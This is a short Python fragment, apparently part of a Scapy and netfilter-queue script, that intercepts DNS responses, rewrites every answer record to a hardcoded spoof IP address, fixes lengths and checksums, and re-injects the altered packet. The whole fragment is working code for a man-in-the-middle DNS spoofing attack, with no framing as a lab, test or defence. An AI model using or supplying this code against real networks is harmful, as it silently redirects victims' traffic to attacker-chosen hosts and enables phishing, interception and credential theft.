
spoofIP = "114.114.114.114"

#modify DNS recode
if packet.haslayer(DNS):
    if packet[DNS].an != None:
        packet.an.rdata = spoofIP

    packet[IP].len = len(str(packet))
    packet[UDP].len = len(str(packet[UDP]))
    del packet[IP].chksum,packet[UDP].chksum
    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(packet), len(packet))#set the packet content to our modified version
